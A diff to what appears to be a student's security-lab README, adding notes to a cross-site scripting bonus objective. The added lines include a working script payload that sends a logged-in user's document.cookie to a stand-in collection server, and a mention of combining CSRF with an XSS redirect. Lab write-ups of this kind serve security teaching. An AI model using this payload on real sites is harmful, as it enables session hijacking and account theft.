@@ -78,4 +78,7 @@ Bonus Objective 2: Build on Objective #4 (Cross-Site Scripting). Experiment to s
 
 <img src="https://raw.githubusercontent.com/cheezm91/CodePathWeek8/master/bonus2a.gif">
 
+* We can also steal cookie data using ```<script>document.write('<img src="https://yourserver.com/collect.gif?cookie=' + document.cookie + '" />')</script>``` which will cause the logged in user to send their cookie to your target website
+* It is also possible to set up a CSRF page to set someone's cookie data and using XSS redirect that user to the page
+
 ## Notes
